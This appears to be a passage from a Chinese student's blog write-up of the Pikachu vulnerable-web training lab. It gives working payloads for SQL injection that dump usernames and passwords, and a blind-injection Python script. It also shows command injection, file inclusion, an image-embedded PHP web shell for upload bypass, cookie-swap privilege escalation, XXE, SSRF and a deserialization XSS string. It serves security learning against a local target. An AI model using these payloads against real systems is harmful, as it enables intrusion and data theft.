<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(username) from users),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(password) from users),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122755777.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202123018270.png" alt="在这里插入图片描述"></p>
<h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><img src="https://img-blog.csdnimg.cn/20210202123224348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击删除并抓包看看<br><img src="https://img-blog.csdnimg.cn/2021020212370529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>在id处进行报错注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">56</span><span class="operator">%</span><span class="number">20</span><span class="keyword">or</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202123943418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">接下来就和上边大同小异了，就不多写了</p>
<h2 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h2><p><a href="http://t0mrvvi1b3t.top/2021/04/29/http/">关于http头</a></p>
<h3 id="在User-Agent处注入"><a href="#在User-Agent处注入" class="headerlink" title="在User-Agent处注入"></a>在User-Agent处注入</h3><p>先随便登陆一下<br><img src="https://img-blog.csdnimg.cn/20210202135551902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202135656799.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210202135734904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="string">&#x27; or updatexml(1,concat(0x7e,database ()),0) or &#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202135818376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">接下来就和之前的差不多一样了，自己操作就行了</p>
<h3 id="在Cookie处注入"><a href="#在Cookie处注入" class="headerlink" title="在Cookie处注入"></a>在Cookie处注入</h3><p>还是一样的操作将第二个包发送到repeater<br><img src="https://img-blog.csdnimg.cn/20210202140258556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">构造语句：<span class="string">&#x27;and updatexml (1,concat(0x7e,database()),0)#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202140353275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这样也可以爆出数据库名</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kobe&#39; and ascii(substr(database(),1,1))&#x3D;112#</span><br></pre></td></tr></table></figure>

<p>有关函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length()函数的作用是返回字符串str的长度，以字节为单位。一个多字节字符算作多字节。这意味着，对于包含四个两字节字符的字符串，length() 返回8,  而 char_length() 返回 4</span><br><span class="line"></span><br><span class="line">length(&#39;text&#39;)返回值为4</span><br><span class="line"></span><br><span class="line">substr()函数从特定位置开始的字符串返回一个给定长度的子字符串</span><br><span class="line">substr()函数有三个参数，用法为：substr(str,pos,len)</span><br><span class="line">str参数代表待截取的字符串</span><br><span class="line">pos参数代表从什么位置开始截取</span><br><span class="line">len参数表示字符串截取的长度</span><br><span class="line"></span><br><span class="line">ascii()函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符</span><br></pre></td></tr></table></figure>

<p>原理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">无法使用union来直接查询时，需要用到关键字and，只有and前后的条件都为真的时候，数据库才会输出结果。 将返回字符串的ascii与注入语句的ascii进行比较，相等时才会返回正常的页面，利用这个进行爆破即可</span><br></pre></td></tr></table></figure>

<p>可使用bp进行爆破也可写python脚本</p>
<p><del>经过几个小时的奋战，终于整完了python脚本 hahahah</del></p>
<p>爆破数据库的python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe%s&amp;submit=查询&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&amp;submit=查询&quot;</span></span><br><span class="line">payload=<span class="string">&quot;%27+and+ascii%28substr%28database%28%29%2C&#123;0&#125;%2C1%29%29%3D&#123;1&#125;%23&quot;</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start to retrive the database&quot;</span>)</span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        p=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line">        url=url1 % p</span><br><span class="line">        r=((requests.get(url)).text).find(<span class="string">&#x27;pikachu.com&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r==<span class="number">31550</span>:</span><br><span class="line">        	b=j</span><br><span class="line">    database+=<span class="built_in">chr</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the database is :%s&quot;</span> % database)</span><br></pre></td></tr></table></figure>



<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>都为盲注，利用sleep函数设定一个时长，通过页面的反应时间来判断注入语句的ascii与对应字符是否相等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例</span><br><span class="line">kobe’ and sleep(5)#</span><br><span class="line">kobe&#39; and if ((substr(database(),1,1))&#x3D;&#39;a&#39;,sleep&#x3D;(5),null)#</span><br><span class="line">1ms就返回结果 说明不是 &quot;a&quot;一直爆破到确定数据库的全称</span><br></pre></td></tr></table></figure>

<p>注入之前可以先测试<code>kobe’ and sleep(5)#</code>若确实是5s之后页面刷新则存在时间盲注</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>抓包修改数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改name值为kobe%df&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e6/846df244abcc61f41fcda33e1097feb2752b00.png"></p>
<p>得到回显</p>
<p><img src="https://img.vim-cn.com/cb/074c06446545c30e8107f592c961b403bdcbad.png"></p>
<p>说明存在注入</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><a href="http://t0mrvvi1b3t.top/2021/04/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">关于rce</a></p>
<h2 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h2><p><img src="https://img.vim-cn.com/2f/e10a700d174e68246d8443bf9c4be7b63fb42d.png"></p>
<p>利用管道符拼接命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure>

<p>就可以返回电脑的用户名</p>
<h2 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2><p><img src="https://img.vim-cn.com/25/f221d66f3518ab84707179f7bfdf293230fb8e.png"></p>
<p><a href="https://www.php.net/eval">关于eval函数</a></p>
<p>执行代码 payload：<code>phpinfo();</code></p>
<p>即可看到phpinfo</p>
<h1 id="File-inclusion-文件包含"><a href="#File-inclusion-文件包含" class="headerlink" title="File inclusion( 文件包含 )"></a>File inclusion( 文件包含 )</h1><p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。                        但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。</p>
<h2 id="File-inclusion-local"><a href="#File-inclusion-local" class="headerlink" title="File inclusion( local )"></a>File inclusion( local )</h2><p>本地包含</p>
<p>随便选择一个</p>
<p><img src="https://img.vim-cn.com/8a/eb86b177acced6faa3b3d14f7ccf91e0815916.png"></p>
<p>观察url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;file1.php&amp;submit&#x3D;提交查询</span><br></pre></td></tr></table></figure>

<p>在本地文件夹写写一个1.txt文本</p>
<p><img src="https://img.vim-cn.com/a4/dfc3100b6040eba1e2fbf2ad914076a094f1a5.png"></p>
<p>修改url</p>
<p><img src="https://img.vim-cn.com/35/ffdad9528c963cca07f828a16704aa51afa791.png"></p>
<p>成功包含</p>
<p>源码👇</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line"><span class="comment">//     //安全的写法,使用白名单，严格指定包含的文件名</span></span><br><span class="line"><span class="comment">//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//         include &quot;include/$filename&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="File-inclusion-remote"><a href="#File-inclusion-remote" class="headerlink" title="File inclusion( remote )"></a>File inclusion( remote )</h2><p><img src="https://img.vim-cn.com/ef/2b63aa1cb083610b4a05bf84c85021c7e979cf.png"></p>
<p>找到本机的php.ini修改配置文件</p>
<p><img src="https://img.vim-cn.com/1a/9453be568c4b11e4d04f2f942105bb16d03067.png"></p>
<p>利用kali做远程主机，在/var/www/html文件夹内写入1.php</p>
<p><img src="https://img.vim-cn.com/5b/f089c4d6ee18432e87161990dab433cbe10007.png"></p>
<p>开启apache服务</p>
<p><img src="https://img.vim-cn.com/66/fb8e9954c00922faad0ae9df4ffe0a79be1c14.png"></p>
<p>修改filename的值为<a href="http://ip/%E6%96%87%E4%BB%B6%E5%90%8D%E5%8D%B3%E5%8F%AF">http://ip/文件名即可</a></p>
<h1 id="Unsafe-filedownload"><a href="#Unsafe-filedownload" class="headerlink" title="Unsafe filedownload"></a>Unsafe filedownload</h1><p>点击下载，用bp抓包修改数据</p>
<p><img src="https://img.vim-cn.com/09/0e319baa1d8be2cb753b55efbe769b1043f777.png"></p>
<p>修改后即可下载</p>
<p><img src="https://img.vim-cn.com/76/fbba66d802377861c21a1b600adb1a423c0c1d.png"></p>
<h1 id="Unsafe-fileupload"><a href="#Unsafe-fileupload" class="headerlink" title="Unsafe fileupload"></a>Unsafe fileupload</h1><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p><img src="https://img.vim-cn.com/2f/c24c1abbd398499ecb192f00724d6d3da000f3.png"></p>
<p>直接上传不成功，根据名称猜测是前端限制，禁用前端js</p>
<p><img src="https://img.vim-cn.com/38/17aa302884396e7447d6e9d8608c3587ec22c3.png"></p>
<p>再次尝试上传</p>
<p><img src="https://img.vim-cn.com/a3/81bbb500bb969b2afda3f422e52b3f02e40bbf.png"></p>
<p>上传成功</p>
<p><img src="https://img.vim-cn.com/46/ed7136a521540a4689ede9361b66d547983d02.png"></p>
<h2 id="Mime-type"><a href="#Mime-type" class="headerlink" title="Mime type"></a>Mime type</h2><p>抓包修改文件类型即可</p>
<p><img src="https://img.vim-cn.com/56/ef276966936cb8da8ed5b4210f4432e57398bf.png"></p>
<p>放包</p>
<p><img src="https://img.vim-cn.com/04/e3cf0031666248e109f0d271a65d01d0e9ae87.png"></p>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p><a href="https://www.cnblogs.com/andr01la/p/5146422.html">关于copy</a></p>
<p>可利用windows系统命令 <code>copy</code> 将一段php插入到图片里边</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy 2.jpg&#x2F;b+ma.php&#x2F;a 3.jpg</span><br><span class="line"></span><br><span class="line">把ma.php 插入到 2.jpg中 覆盖3.jpg</span><br></pre></td></tr></table></figure>

<p>之后上传图像文件</p>
<p> 因为打开之后是个图片，无法直接利用，通过文件包含的想法来getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url:http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;..&#x2F;..&#x2F;unsafeupload&#x2F;+给出的图片路径&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p>通过蚁剑进行连接即可</p>
<h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞</p>
<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>水平越权 以一个用户来越权操作另一个用户的数据</p>
<p>右上角提示给了3个账号</p>
<p>以kobe账号水平越权lili为例</p>
<p><img src="https://img.vim-cn.com/ad/a4c0edb59a49ae0129c52e18c9ad242a2de082.png"></p>
<p>直接修改一下username的值发现返回lili的信息</p>
<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tips：这里有两个用户admin&#x2F;123456,pikachu&#x2F;000000,admin是超级boss</span><br></pre></td></tr></table></figure>

<p>那就是用pikachu来越权admin了</p>
<p>先登录pikachu账号，发现只有查看权限</p>
<p><img src="https://img.vim-cn.com/41/0edfe03e10a2708faf7916cbe5f04740f124a0.png"></p>
<p>登陆admin账号，发现有添加用户的权限，添加一个用户并抓包发送至repeater模块</p>
<p>退出admin，登陆pikachu，再次抓包获取pikachu的cookie</p>
<p>登陆后发现了刚刚添加的hhh用户</p>
<p><img src="https://img.vim-cn.com/fa/c52643ea0720586e2673fc70c10f46132d8cc9.png"></p>
<p>这时转到bp，用刚刚复制的pikachu的cookie来替换admin的cookie，并修改一下用户信息，点击send</p>
<p>刷新界面就可以看到新增的用户abc了</p>
<p><img src="https://img.vim-cn.com/99/a93fc7fe0b0674f73e2c477b8ab50422eac81c.png"></p>
<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="../../( 目录遍历 )"></a>../../( 目录遍历 )</h1><p><img src="https://img.vim-cn.com/fa/5caf8b25132971c3641b8b470c5b71a60828f9.png"></p>
<p>观察概述的url</p>
<p><img src="https://img.vim-cn.com/92/381e4d9f45d213954b5ceb553edc33ea2e93f6.png"></p>
<p>点击1 可以看到对应的url</p>
<p>把title的值修改为<code>../dir.php</code>即可转到概述界面</p>
<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
<h2 id="icanseeyourABC"><a href="#icanseeyourABC" class="headerlink" title="icanseeyourABC"></a>icanseeyourABC</h2><p>先查看源代码，发现里一个注释</p>
<p><img src="https://img.vim-cn.com/de/f83af66764569764b89669949e237f189a84fc.png"></p>
<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p><strong>序列化serialize()</strong><br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:            </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> S(); <span class="comment">//创建一个对象</span></span><br><span class="line">serialize(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">序列化后得到的结果是这个样子的:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">    O:代表<span class="keyword">object</span></span><br><span class="line">    <span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    <span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    <span class="number">4</span>:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    <span class="number">7</span>:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>反序列化unserialize()</strong></p>
<p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$u</span>=unserialize(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure>

<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">漏洞举例:</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>payload：<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><code>xml外部实体注入漏洞</code></p>
<p>就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
<p>tips：先把XML声明、DTD文档类型定义、文档元素这些基础知识自己看一下</p>
<p><code>payload：&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;xxe&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</code></p>
<p><img src="https://img.vim-cn.com/c3/635e0fe9aa8b0a38b868251ad57841094e1702.png"></p>
<h1 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1><p>有4个超链接</p>
<p><img src="https://img.vim-cn.com/8c/b149c61e557813a7bc2e5e40911f219538b917.png"></p>
<p>可以修改第三个和第四个的url的值（修改为某个网址的url）来实现网页跳转</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p>
<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p>
<p>​            导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>​            数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>​            根据后台使用的函数的不同,对应的影响和利用方法又有不一样            </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF( curl )"></a>SSRF( curl )</h2><p><img src="https://img.vim-cn.com/d7/5eac2b9f9c8051751e22667ed1545c31a552e7.png"></p>
<p>点击链接</p>
<p><img src="https://img.vim-cn.com/11/00492eb830ce580aca87eb342c41a5267c28cb.png"></p>
<p>修改一下url即可实现跳转（改为百度的地址</p>
<p><img src="https://img.vim-cn.com/95/d6600cb6eeaf58998dd8dc77194adcc7281ff3.png"></p>
<p>success！</p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF( file_get_content )"></a>SSRF( file_get_content )</h2><p>1、与上一个方法相同</p>
<p>2、也可以利用这个修改file值读取到网页源码</p>
<p><code>payload：?file=php://filter/read=convert.base64-encode/resource=ssrf.php</code></p>
<p>会发现源码以base64编码的形式出现在了页面下边，进行解码即可看到源码（太长了就不放了</p>
<hr>
<p>历时3天终于完事儿了，一直抽空在搞这个，考虑把web从一个大框架上来整体看一下，重新开始有目的的去学一下，靶场内的都是没有过滤的简单的漏洞复现，过几天会找一下相关比赛题目来复现一下。</p>
]]></content>
      <categories>
        <category>靶场漏洞复现</category>
        <category>web学习</category>
      </categories>
  </entry>
</search>
